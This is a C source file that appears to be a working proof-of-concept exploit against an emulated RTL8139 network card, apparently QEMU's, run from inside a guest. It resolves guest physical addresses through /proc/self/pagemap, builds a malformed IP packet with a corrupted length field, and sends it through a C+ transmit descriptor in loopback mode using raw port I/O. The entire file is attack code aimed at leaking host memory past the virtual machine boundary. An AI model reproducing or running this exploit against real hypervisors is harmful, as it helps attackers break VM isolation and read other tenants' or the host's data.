#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <limits.h>
#include <err.h>
#include "rtl8139.h"

#define RTL8139 0xc000
#define ETH_P_IP    0x0800      /* Internet Protocol packet */

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

uint32_t fd;

uint32_t page_offset(uint32_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

int cmp_page_offset(const void *a, const void *b)
{
	return page_offset(*(uint64_t *)a) - page_offset(*(uint64_t *)b);
}

void die(const char* msg)
{
    perror(msg);
    exit(-1);
            
}

void rtl8139_writeb(uint32_t reg, uint32_t val) {
    outb(val, RTL8139 + reg);
}

void rtl8139_writew(uint32_t reg, uint32_t val) {
    outw(val, RTL8139 + reg);
}

void rtl8139_writel(uint32_t reg, uint32_t val) {
    outl(val, RTL8139 + reg);
}

void rtl8139_cplus_transmit() {
    rtl8139_writeb(TxPoll, 1 << 6);
}

void enable_transmitter() {
    rtl8139_writeb(ChipCmd, CmdTxEnb);
}

void enable_receiver() {
    rtl8139_writeb(ChipCmd, CmdRxEnb);
}

void enable_cp_transmitter() {
    rtl8139_writew(CpCmd, CPlusTxEnb);
}

void set_txaddr(uint32_t offset, uint32_t val) {
    rtl8139_writel(TxAddr0 + 4 * offset, val);
}

void set_loopback() {
    rtl8139_writel(TxConfig, TxLoopBack);
}

/* malformed ip packet with corrupted header size */
uint8_t malformed_eth_packet[]= {
    /* mac layer start */
    // mac addr 52:54:00:12:34:57, src and dst
    0x50, 0x54, 0x00, 0x12, 0x34, 0x57, 0x50, 0x54, 0x00, 0x12, 0x34, 0x57,
    // ip type
    0x08, 0x00,
    /* mac layer end */

    /* ip layer start */
    // ip version and ip header len
    0x45,
    // tos
    0x00,
    // total len
    0x00, 0x13,
    // id
    0x12, 0x17,
    // flags(3 bits) and offset(13 bits)
    0x40, 0x00,
    // TTL
    0xff,
    // tcp protocol
    0x06,
    // checksum
    0xff, 0xff,
    // src ip and dst ip
    0x7f, 0x00, 0x00, 0x01, 0x7f, 0x00, 0x00, 0x01,
    /* ip layer end */

    /* tcp layer start */
    // src port and dst port
    0x12, 0x17, 0x12, 0x17,
    // seq num
    0x12, 0x34, 0x56, 0x78,
    // ack num
    0x12, 0x34, 0x56, 0x78,
    // header len(4 bits) and resv(4 bits)
    0x50,
    // code bits
    0x10,
    // window size, checksum, urg pointer
    0x00, 0x00, 0xff, 0xff, 0x00, 0x00
};

typedef struct {
    uint32_t txdw0;
    uint32_t txdw1;
    uint32_t txbufLO;
    uint32_t txbufHI;
} rtl8139_cplus_tx_ring_desc;

int main() {

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        die("open pagemap failed!");
    }

    rtl8139_cplus_tx_ring_desc *cplus_tx_ring_desc = (rtl8139_cplus_tx_ring_desc *)malloc(sizeof(rtl8139_cplus_tx_ring_desc));
    
    cplus_tx_ring_desc->txdw0 = (CP_TX_OWN | CP_TX_LS | CP_TX_LGSEN | CP_TX_TCPCS) | sizeof(malformed_eth_packet);
    cplus_tx_ring_desc->txdw1 = 0;
    cplus_tx_ring_desc->txbufLO = gva_to_gpa(malformed_eth_packet);
    cplus_tx_ring_desc->txbufHI = 0;

    printf("cplus_tx_ring_desc->txdw0: %x\n", cplus_tx_ring_desc->txdw0);
    printf("cplus_tx_ring_desc->txdw1: %x\n", cplus_tx_ring_desc->txdw1);
    printf("cplus_tx_ring_desc->txbufLO: %x\n", cplus_tx_ring_desc->txbufLO);
    printf("cplus_tx_ring_desc->txbufHI: %x\n", cplus_tx_ring_desc->txbufHI);

    printf("cplus_tx_ring_desc phy addr: %x\n", gva_to_gpa(cplus_tx_ring_desc));
    printf("malformed_eth_packet phy addr: %x\n", gva_to_gpa(malformed_eth_packet));

    iopl(3);
    enable_transmitter();
    enable_receiver();
    enable_cp_transmitter();
    set_txaddr(0, gva_to_gpa(cplus_tx_ring_desc));
    set_txaddr(1, 0);
    set_loopback();
    
    
    rtl8139_cplus_transmit();
    return 0;
}
